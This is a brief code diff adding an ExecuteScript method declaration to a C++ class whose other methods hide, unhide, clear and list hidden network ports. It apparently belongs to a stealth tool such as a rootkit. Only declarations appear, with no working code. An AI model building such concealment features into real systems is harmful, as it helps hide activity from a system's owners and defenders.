@@ -83,4 +83,5 @@ public:
 	NidhoggErrorCodes UnhidePort(USHORT portNumber, PortType portType, bool remote);
 	NidhoggErrorCodes ClearHiddenPorts();
 	std::vector<HiddenPort> QueryHiddenPorts();
+	NidhoggErrorCodes ExecuteScript(BYTE* script, DWORD scriptSize);
 };
